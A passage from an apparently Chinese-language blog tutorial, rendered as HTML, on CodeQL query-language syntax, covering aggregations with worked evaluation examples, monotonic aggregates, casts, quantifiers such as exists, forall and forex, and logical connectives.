class=\"number\">1</span> &#125;</span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"title function_\">getANumber</span><span class=\"params\">()</span> &#123; result = <span class=\"number\">3</span> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">C</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">A</span>, B &#123;</span><br><span class=\"line\">  <span class=\"comment\">// Need to define `int getANumber()`; otherwise it would be ambiguous</span></span><br><span class=\"line\">  override <span class=\"type\">int</span> <span class=\"title function_\">getANumber</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    result = B.<span class=\"built_in\">super</span>.getANumber()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from C c</span><br><span class=\"line\">select c, c.getANumber()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Calls-to-predicates\"><a href=\"#Calls-to-predicates\" class=\"headerlink\" title=\"Calls to predicates\"></a>Calls to predicates</h2><p>调用类的方法</p>\n<p>例如 a.getAChild() 是调用的 a 的谓词 getAChild()</p>\n<h2 id=\"Aggregations\"><a href=\"#Aggregations\" class=\"headerlink\" title=\"Aggregations\"></a>Aggregations</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;aggregate&gt;(&lt;variable declarations&gt; | &lt;formula&gt; | &lt;expression&gt;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 内容超过500行的文件</span></span><br><span class=\"line\">count(File f | f.getTotalNumberOfLines() &gt; <span class=\"number\">500</span> | f)   </span><br><span class=\"line\"><span class=\"comment\">// 寻找函数最多的js文件。  </span></span><br><span class=\"line\">max(File f | f.getExtension() = <span class=\"string\">&quot;js&quot;</span> | f.getBaseName() order by f.getTotalNumberOfLines(), f.getNumberOfLinesOfCode())</span><br><span class=\"line\"><span class=\"comment\">// 逐个字符比较 返回 De Morgan</span></span><br><span class=\"line\">min(string s | s = <span class=\"string\">&quot;Tarski&quot;</span> <span class=\"type\">or</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Dedekind&quot;</span> <span class=\"type\">or</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;De Morgan&quot;</span> | s)</span><br><span class=\"line\"><span class=\"comment\">// 返回36，等等吧，还有很多。</span></span><br><span class=\"line\">sum(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j | i = [<span class=\"number\">0</span> .. <span class=\"number\">2</span>] <span class=\"type\">and</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> [<span class=\"number\">3</span> .. <span class=\"number\">5</span>] | i * j)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Evaluation-of-aggregates\"><a href=\"#Evaluation-of-aggregates\" class=\"headerlink\" title=\"Evaluation of aggregates\"></a>Evaluation of aggregates</h3><p>以这个为例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select <span class=\"title function_\">sum</span><span class=\"params\">(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j |</span></span><br><span class=\"line\"><span class=\"params\">    exists(string s | s = <span class=\"string\">&quot;hello&quot;</span>.charAt(i)</span>) and </span><br><span class=\"line\">    <span class=\"title function_\">exists</span><span class=\"params\">(string s | s = <span class=\"string\">&quot;world!&quot;</span>.charAt(j)</span>) </span><br><span class=\"line\">    | i)</span><br></pre></td></tr></table></figure>\n\n<p>步骤</p>\n<ol>\n<li><p><strong>确定输入变量</strong>：这是聚合表达式中声明的变量，包括在聚合内声明的变量和在聚合外部使用的变量。</p>\n</li>\n<li><p><strong>生成所有可能的元组（组合）</strong>：这些元组是输入变量的所有可能值的组合，必须满足给定的条件公式。</p>\n</li>\n<li><p>**应用 <expression>**：对每个元组应用<expression>，并收集生成的值（可能有多个不同的值）。</p>\n</li>\n<li><p><strong>应用 aggregates function</strong>：使用 aggregates function（如 sum、count 等）对第3步中生成的值进行处理，计算最终结果。</p>\n</li>\n</ol>\n<p><strong>1. 确定输入变量：</strong></p>\n<p>•输入变量是 i 和 j，分别代表 “hello” 和 “world!” 中的字符位置。</p>\n<p><strong>2. 生成所有可能的元组：</strong></p>\n<p>•我们通过 exists(string s | s &#x3D; “hello”.charAt(i)) 和 exists(string s | s &#x3D; “world!”.charAt(j)) 来生成所有可能的 (i, j) 对，表示字符串 “hello” 和 “world!” 中字符的位置。</p>\n<p>•”hello” 有 5 个字符（0, 1, 2, 3, 4），而 “world!” 有 6 个字符（0, 1, 2, 3, 4, 5）。</p>\n<p>•所以所有可能的 (i, j) 对是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(0, 0), (0, 1), (0, 2), (0, 3), (0, 4), (0, 5),</span><br><span class=\"line\">(1, 0), (1, 1), (1, 2), (1, 3), (1, 4), (1, 5),</span><br><span class=\"line\">(2, 0), (2, 1), (2, 2), (2, 3), (2, 4), (2, 5),</span><br><span class=\"line\">(3, 0), (3, 1), (3, 2), (3, 3), (3, 4), (3, 5),</span><br><span class=\"line\">(4, 0), (4, 1), (4, 2), (4, 3), (4, 4), (4, 5)</span><br></pre></td></tr></table></figure>\n\n<p><strong>3. 应用<expression>：</strong></p>\n<p>•在这个查询中，聚合表达式是 i。我们从每个元组中选择 i 的值。</p>\n<p>•例如，所有 30 个元组中，i 的值会分别为：</p>\n<p><code>0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4, 4, 4</code></p>\n<p><strong>4. 应用 aggregates function：</strong></p>\n<p><code>0 + 0 + 0 + 0 + 0 + 0 + 1 + 1 + 1 + 1 + 1 + 1 + 2 + 2 + 2 + 2 + 2 + 2 + 3 + 3 + 3 + 3 + 3 + 3 + 4 + 4 + 4 + 4 + 4 + 4</code></p>\n<p>值为60。</p>\n<p>如果为这种</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select <span class=\"title function_\">sum</span><span class=\"params\">(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j |</span></span><br><span class=\"line\"><span class=\"params\">    exists(string s | s = <span class=\"string\">&quot;hello&quot;</span>.charAt(i)</span>) and </span><br><span class=\"line\">    <span class=\"title function_\">exists</span><span class=\"params\">(string s | s = <span class=\"string\">&quot;world!&quot;</span>.charAt(j)</span>) </span><br><span class=\"line\">    | i+j)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 + 0 = 0</span><br><span class=\"line\">0 + 1 = 1</span><br><span class=\"line\">0 + 2 = 2</span><br><span class=\"line\">...</span><br><span class=\"line\">4 + 5 = 9</span><br></pre></td></tr></table></figure>\n\n<p>值为135</p>\n<p>按照那4步来就行。</p>\n<h3 id=\"Omitting-parts-of-an-aggregation\"><a href=\"#Omitting-parts-of-an-aggregation\" class=\"headerlink\" title=\"Omitting parts of an aggregation\"></a>Omitting parts of an aggregation</h3><p>其实有些地方可以适当简写。</p>\n<ol>\n<li><strong>省略 <variable declarations> 和 <formula></strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;aggregate&gt;(&lt;type&gt; v | &lt;expression&gt; = v | v)</span><br><span class=\"line\">简写成</span><br><span class=\"line\">&lt;aggregate&gt;(&lt;expression&gt;)</span><br></pre></td></tr></table></figure>\n\n<p>例如</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">count(<span class=\"type\">int</span> i | i = <span class=\"string\">&quot;hello&quot;</span>.indexOf(<span class=\"string\">&quot;l&quot;</span>) | i)</span><br><span class=\"line\">count(<span class=\"string\">&quot;hello&quot;</span>.indexOf(<span class=\"string\">&quot;l&quot;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>• “hello”.indexOf(“l”) 直接返回所有 “l” 的索引位置（2, 3）。</p>\n<p>• count 统计这些索引的个数，因此两种写法等价。</p>\n<ol start=\"2\">\n<li><strong>省略 <expression></strong></li>\n</ol>\n<p>如果只有一个aggregation variable，则可以省略 aggregation variable，此时表达式默认为该变量本身。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">avg(int i | i = [0 .. 3] | i)</span><br><span class=\"line\">avg(int i | i = [0 .. 3])</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>在 count 中，即使有多个aggregation variable，也可以省略 <expression>，此时表达式默认为常量 1，即统计满足条件的所有元组数量。</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">count(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j | i in [<span class=\"number\">1</span> .. <span class=\"number\">3</span>] and j in [<span class=\"number\">1</span> .. <span class=\"number\">3</span>] | <span class=\"number\">1</span>)</span><br><span class=\"line\">count(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j | i in [<span class=\"number\">1</span> .. <span class=\"number\">3</span>] and j in [<span class=\"number\">1</span> .. <span class=\"number\">3</span>])</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>省略 <formula>，仅保留两个竖线 ||</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;aggregate&gt;(&lt;variable declarations&gt; | | &lt;expression&gt;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">max(File f | | f.getTotalNumberOfLines())</span><br></pre></td></tr></table></figure>\n\n<p>这段代码的意思是：统计数据库中所有文件的最大行数。</p>\n<ol start=\"5\">\n<li><strong>省略 <formula> 和 <expression></strong></li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">count(File f | any() | <span class=\"number\">1</span>)</span><br><span class=\"line\">count(File f | | <span class=\"number\">1</span>)</span><br><span class=\"line\">count(File f)</span><br></pre></td></tr></table></figure>\n\n<p>count(File f) 直接统计数据库中的文件数量。</p>\n<h3 id=\"Monotonic-单调-aggregates\"><a href=\"#Monotonic-单调-aggregates\" class=\"headerlink\" title=\"Monotonic(单调) aggregates\"></a>Monotonic(单调) aggregates</h3><p>直接看官方给的例子吧。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string <span class=\"title function_\">getPerson</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;Alice&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                     <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Bob&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                     <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Charles&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                     <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Diane&quot;</span></span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">string <span class=\"title function_\">getFruit</span><span class=\"params\">(string p)</span> &#123; p = <span class=\"string\">&quot;Alice&quot;</span>   <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Orange&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                            <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Alice&quot;</span>   <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Apple&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                            <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Bob&quot;</span>     <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Apple&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                            <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Charles&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Apple&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                            <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Charles&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Banana&quot;</span></span><br><span class=\"line\">                          &#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getPrice</span><span class=\"params\">(string f)</span> &#123; f = <span class=\"string\">&quot;Apple&quot;</span>  <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"number\">100</span> <span class=\"type\">or</span></span><br><span class=\"line\">                         <span class=\"variable\">f</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Orange&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"number\">100</span> <span class=\"type\">or</span></span><br><span class=\"line\">                         <span class=\"variable\">f</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Orange&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span>   <span class=\"number\">1</span></span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">predicate <span class=\"title function_\">nonmono</span><span class=\"params\">(string p, <span class=\"type\">int</span> cost)</span> &#123;</span><br><span class=\"line\">  p = getPerson() <span class=\"type\">and</span> <span class=\"variable\">cost</span> <span class=\"operator\">=</span> sum(string f | f = getFruit(p) | getPrice(f))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">language[monotonicAggregates]</span><br><span class=\"line\">predicate <span class=\"title function_\">mono</span><span class=\"params\">(string p, <span class=\"type\">int</span> cost)</span> &#123;</span><br><span class=\"line\">  p = getPerson() <span class=\"type\">and</span> <span class=\"variable\">cost</span> <span class=\"operator\">=</span> sum(string f | f = getFruit(p) | getPrice(f))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from string variant, string person, <span class=\"type\">int</span> cost</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">variant</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;default&quot;</span>  and <span class=\"title function_\">nonmono</span><span class=\"params\">(person, cost)</span> <span class=\"type\">or</span></span><br><span class=\"line\">      <span class=\"variable\">variant</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;monotonic&quot;</span> and <span class=\"title function_\">mono</span><span class=\"params\">(person, cost)</span></span><br><span class=\"line\">select variant, person, cost</span><br><span class=\"line\">order by variant, person</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"left\">variant</th>\n<th align=\"left\">person</th>\n<th align=\"left\">cost</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">default</td>\n<td align=\"left\">Alice</td>\n<td align=\"left\">201</td>\n</tr>\n<tr>\n<td align=\"left\">default</td>\n<td align=\"left\">Bob</td>\n<td align=\"left\">100</td>\n</tr>\n<tr>\n<td align=\"left\">default</td>\n<td align=\"left\">Charles</td>\n<td align=\"left\">100</td>\n</tr>\n<tr>\n<td align=\"left\">default</td>\n<td align=\"left\">Diane</td>\n<td align=\"left\">0</td>\n</tr>\n<tr>\n<td align=\"left\">monotonic</td>\n<td align=\"left\">Alice</td>\n<td align=\"left\">101</td>\n</tr>\n<tr>\n<td align=\"left\">monotonic</td>\n<td align=\"left\">Alice</td>\n<td align=\"left\">200</td>\n</tr>\n<tr>\n<td align=\"left\">monotonic</td>\n<td align=\"left\">Bob</td>\n<td align=\"left\">100</td>\n</tr>\n<tr>\n<td align=\"left\">monotonic</td>\n<td align=\"left\">Diane</td>\n<td align=\"left\">0</td>\n</tr>\n</tbody></table>\n<p><strong>标准聚合</strong> 和 <strong>单调聚合</strong> 在处理公式 <formula> 和表达式 <expression> 的值时有如下不同：</p>\n<p><strong>标准聚合：</strong></p>\n<p>•对每个由 <formula> 生成的值，计算对应的 <expression> 值，<strong>将它们展平为一个列表</strong>。</p>\n<p>•然后对这个列表应用聚合函数，例如 sum、count 等。</p>\n<p><strong>单调聚合：</strong></p>\n<p>•对每个由 <formula> 生成的值，计算对应的 <expression> 值，<strong>创建所有可能的组合</strong>。</p>\n<p>•对每种组合分别应用聚合函数。</p>\n<p><strong>结果差异：</strong></p>\n<p>•<strong>标准聚合</strong> 通常返回一个结果，表示所有值的总和、计数等。</p>\n<p>•<strong>单调聚合</strong> 会返回多行结果，表示每种可能组合的聚合值。</p>\n<p><strong>场景 1: 缺少 <expression> 值</strong></p>\n<p>•如果 <formula> 生成的某个值没有对应的 <expression> 值：</p>\n<p>•<strong>标准聚合</strong> 会忽略这个缺失值，计算其他值的结果。</p>\n<p>•<strong>单调聚合</strong> 不会计算结果，因为缺失值使得无法创建完整的组合。</p>\n<p><strong>场景 2: 多个 <expression> 值</strong></p>\n<p>•如果 <formula> 生成的某个值有多个对应的 <expression> 值：</p>\n<p>•<strong>标准聚合</strong> 将所有 <expression> 值展平成一个列表，计算一个结果。</p>\n<p>•<strong>单调聚合</strong> 会生成多种组合，对每种组合分别计算结果。</p>\n<h4 id=\"Recursive-monotonic-aggregates\"><a href=\"#Recursive-monotonic-aggregates\" class=\"headerlink\" title=\"Recursive monotonic aggregates\"></a>Recursive monotonic aggregates</h4><p>暂时不讲解</p>\n<h2 id=\"Any\"><a href=\"#Any\" class=\"headerlink\" title=\"Any\"></a>Any</h2><table>\n<thead>\n<tr>\n<th align=\"left\">Expression</th>\n<th align=\"left\">Values</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>any(File f)</code></td>\n<td align=\"left\">all <code>File</code>s in the database</td>\n</tr>\n<tr>\n<td align=\"left\">&#96;any(Element e</td>\n<td align=\"left\">e.getName())&#96;</td>\n</tr>\n<tr>\n<td align=\"left\">&#96;any(int i</td>\n<td align=\"left\">i &#x3D; [0 .. 3])&#96;</td>\n</tr>\n<tr>\n<td align=\"left\">&#96;any(int i</td>\n<td align=\"left\">i &#x3D; [0 .. 3]</td>\n</tr>\n</tbody></table>\n<h2 id=\"Unary-operations\"><a href=\"#Unary-operations\" class=\"headerlink\" title=\"Unary operations\"></a>Unary operations</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-6.28</span><br><span class=\"line\">+(10 - 4)</span><br><span class=\"line\">+avg(float f | f = 3.4 or f = -9.8)</span><br><span class=\"line\">-sum(int i | i in [0 .. 9] | i * i)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Binary-operations\"><a href=\"#Binary-operations\" class=\"headerlink\" title=\"Binary operations\"></a>Binary operations</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5 % 2</span><br><span class=\"line\">(9 + 1) / (-2)</span><br><span class=\"line\">&quot;Q&quot; + &quot;L&quot;</span><br><span class=\"line\">2 * min(float f | f in [-3 .. 3])</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Casts-类型转换\"><a href=\"#Casts-类型转换\" class=\"headerlink\" title=\"Casts(类型转换)\"></a>Casts(类型转换)</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"></span><br><span class=\"line\">from Type t</span><br><span class=\"line\">where t.(Class).getASupertype().hasName(<span class=\"string\">&quot;List&quot;</span>)</span><br><span class=\"line\">select t</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Don’t-care-expressions\"><a href=\"#Don’t-care-expressions\" class=\"headerlink\" title=\"Don’t-care expressions\"></a>Don’t-care expressions</h2><p>其实这个符号在其它语言也经常见</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from string s</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;hello&quot;</span>.charAt(_)</span><br><span class=\"line\">select s</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Formulas-公式\"><a href=\"#Formulas-公式\" class=\"headerlink\" title=\"Formulas 公式\"></a>Formulas 公式</h1><h2 id=\"Comparisons-比较\"><a href=\"#Comparisons-比较\" class=\"headerlink\" title=\"Comparisons 比较\"></a>Comparisons 比较</h2><p>这里提一下。<br>就是一个等号在这里代表的就是Equal to<br>Not equal to就是 !&#x3D;<br>定义的话用的是from</p>\n<h2 id=\"Type-checks\"><a href=\"#Type-checks\" class=\"headerlink\" title=\"Type checks\"></a>Type checks</h2><p>类型检查，和java里面的instanceof功能差不多</p>\n<p><code>&lt;expression&gt; instanceof &lt;type&gt;</code></p>\n<h2 id=\"Range-checks\"><a href=\"#Range-checks\" class=\"headerlink\" title=\"Range checks\"></a>Range checks</h2><p>检查范围<br>A range check is a formula that looks like:<br><code>&lt;expression&gt; in &lt;range&gt;</code></p>\n<p><code>x in [2.1 .. 10.5]</code> </p>\n<h2 id=\"Calls-to-predicates-1\"><a href=\"#Calls-to-predicates-1\" class=\"headerlink\" title=\"Calls to predicates\"></a>Calls to predicates</h2><p>谓词调用。</p>\n<h2 id=\"Parenthesized-formulas\"><a href=\"#Parenthesized-formulas\" class=\"headerlink\" title=\"Parenthesized formulas\"></a>Parenthesized formulas</h2><p>杯括号包裹起来的 formulas</p>\n<h3 id=\"Explicit-quantifiers显示量词\"><a href=\"#Explicit-quantifiers显示量词\" class=\"headerlink\" title=\"Explicit quantifiers显示量词\"></a>Explicit quantifiers显示量词</h3><h4 id=\"exists\"><a href=\"#exists\" class=\"headerlink\" title=\"exists\"></a><code>exists</code></h4><p>都很好理解。</p>\n<p>This quantifier has the following syntax:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exists(&lt;variable declarations&gt; | &lt;formula&gt;)</span><br></pre></td></tr></table></figure>\n\n<p>You can also write <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code>. This is equivalent to <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; and &lt;formula 2&gt;)</code>.</p>\n<p>This quantified formula introduces some new variables. It holds if there is at least one set of values that the variables could take to make the formula in the body true.</p>\n<p>For example, <code>exists(int i | i instanceof OneTwoThree)</code> introduces a temporary variable of type <code>int</code> and holds if any value of that variable has type <code>OneTwoThree</code>.</p>\n<h4 id=\"forall\"><a href=\"#forall\" class=\"headerlink\" title=\"forall\"></a><code>forall</code></h4><p>This quantifier has the following syntax:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forall(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure>\n\n<p><code>forall</code> introduces some new variables, and typically has two formulas in its body. It holds if <code>&lt;formula 2&gt;</code> holds for all values that <code>&lt;formula 1&gt;</code> holds for.</p>\n<p>For example, <code>forall(int i | i instanceof OneTwoThree | i &lt; 5)</code> holds if all integers that are in the class <code>OneTwoThree</code> are also less than <code>5</code>. In other words, if there is a value in <code>OneTwoThree</code> that is greater than or equal to <code>5</code>, then the formula doesn’t hold.</p>\n<p>Note that <code>forall(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code> is logically the same as <code>not exists(&lt;vars&gt; | &lt;formula 1&gt; | not &lt;formula 2&gt;)</code>.</p>\n<h4 id=\"forex\"><a href=\"#forex\" class=\"headerlink\" title=\"forex\"></a><code>forex</code></h4><p>This quantifier has the following syntax:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forex(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure>\n\n<p>This quantifier exists as a shorthand for:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forall(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;) and</span><br><span class=\"line\">exists(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>In other words, <code>forex</code> works in a similar way to <code>forall</code>, except that it ensures that there is at least one value for which <code>&lt;formula 1&gt;</code> holds. To see why this is useful, note that the <code>forall</code> quantifier could hold trivially. For example, <code>forall(int i | i = 1 and i = 2 | i = 3)</code> holds: there are no integers <code>i</code> which are equal to both <code>1</code> and <code>2</code>, so the second part of the body <code>(i = 3)</code> holds for every integer for which the first part holds.</p>\n<p>Since this is often not the behavior that you want in a query, the <code>forex</code> quantifier is a useful shorthand.</p>\n</blockquote>\n<h3 id=\"Implicit-quantifiers\"><a href=\"#Implicit-quantifiers\" class=\"headerlink\" title=\"Implicit quantifiers\"></a>Implicit quantifiers</h3><p>相当于我们上面提到的 Don’t-care expressions。</p>\n<h2 id=\"Logical-connectives\"><a href=\"#Logical-connectives\" class=\"headerlink\" title=\"Logical connectives\"></a>Logical connectives</h2><ol>\n<li>Negation (not)</li>\n<li>Conditional formula (if…..then…else)</li>\n<li>Conjunction (and)</li>\n<li>Disjunction (or)</li>\n<li>Implication (implies)</li>\n</ol>\n<h3 id=\"any\"><a href=\"#any\" class=\"headerlink\" title=\"any()\"></a><code>any()</code></h3><h3 id=\"none\"><a href=\"#none\" class=\"headerlink\" title=\"none()\"></a><code>none()</code></h3><h3 id=\"not\"><a href=\"#not\" class=\"headerlink\" title=\"not\"></a><code>not</code></h3><p>……</p>\n<h1 id=\"Annotations\"><a href=\"#Annotations\" class=\"headerlink\" title=\"Annotations\"></a>Annotations</h1><p>有点像java里面的修饰符。</p>\n<p>像 <code>abstract</code> <code>deprecated</code> <code>final</code>这些前面都提到过。</p>\n<h1 id=\"Lexical-syntax\"><a href=\"#Lexical-syntax\" class=\"headerlink\" title=\"Lexical syntax\"></a>Lexical syntax</h1><h2 id=\"Comments\"><a href=\"#Comments\" class=\"headerlink\" title=\"Comments\"></a>Comments</h2><p>有两种注释方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span 